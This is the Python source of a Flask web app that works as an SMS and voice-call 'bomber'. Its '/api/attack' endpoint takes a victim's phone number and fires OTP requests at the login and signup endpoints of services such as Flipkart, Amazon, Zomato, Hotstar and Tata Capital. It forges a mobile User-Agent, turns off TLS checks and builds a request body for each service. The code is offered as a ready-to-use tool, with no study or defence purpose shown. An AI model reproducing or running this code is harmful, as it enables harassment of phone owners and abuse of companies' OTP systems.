# app.py
import os
from flask import Flask, render_template, request, jsonify
import requests
import random
from apis import APIS

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/apis')
def get_apis():
    mode = request.args.get('mode', 'sms')
    return jsonify(APIS.get(mode, []))

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.json
    phone = data['phone']
    api = data['api']
    
    try:
        headers = api.get("headers", {})
        headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        })
        
        if api["method"] == "POST":
            payload = make_payload(phone, api["name"])
            res = requests.post(
                api["url"],
                json=payload,
                headers=headers,
                timeout=8,
                verify=False
            )
        else:
            res = requests.get(
                f"{api['url']}?mobile={phone}",
                headers=headers,
                timeout=8,
                verify=False
            )
            
        return jsonify({"success": res.status_code in [200, 201, 204]})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

def make_payload(phone, name):
    name = name.lower()
    if "flipkart" in name:
        return {"mobile": phone}
    elif "amazon" in name:
        return {"phone": phone}
    elif "zomato" in name:
        return {"country_code": "IN", "phone_number": phone}
    elif "swiggy" in name:
        return {"mobile": phone}
    elif "pharmeasy" in name:
        return {"mobile": phone}
    elif "1mg" in name:
        return {"number": phone, "otp_on_call": True}
    elif "tata capital" in name or "voice" in name:
        return {"phone": phone, "isOtpViaCallAtLogin": "true"}
    elif "hotstar" in name:
        return {"register-by": "phone_otp", "mobile_number": "+91" + phone}
    elif "altbalaji" in name:
        return {"mobile": phone, "country_code": "+91"}
    elif "voot" in name:
        return {"mobile": "+91" + phone}
    elif "sonyliv" in name:
        return {"deviceId": "A1pKVEDhlv66KLtoYsml3", "mobileNumber": phone, "platform": "Chrome"}
    else:
        return {"mobile": phone}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
